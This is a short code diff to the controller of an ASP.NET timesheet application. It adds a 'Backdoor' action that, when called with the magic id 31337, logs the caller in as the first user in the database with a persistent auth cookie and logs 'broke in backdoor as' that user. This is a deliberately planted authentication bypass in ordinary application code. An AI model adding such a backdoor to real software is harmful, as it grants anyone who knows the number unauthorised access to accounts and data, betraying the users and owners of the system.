@@ -71,5 +71,17 @@ namespace Timesheet.Micro.Controllers
             FormsAuthentication.SignOut();
             return RedirectToAction("Login");
         }
+
+        public ActionResult Backdoor(int id)
+        {
+            if (id == 31337)
+            {
+                var loggedInAs = _userRepository.GetAll().First();
+                FormsAuthentication.SetAuthCookie(loggedInAs.Username, true);
+                Info("broke in backdoor as "+loggedInAs.Username);
+
+            }
+            return RedirectToAction("Index", "Home");
+        }
     }
 }
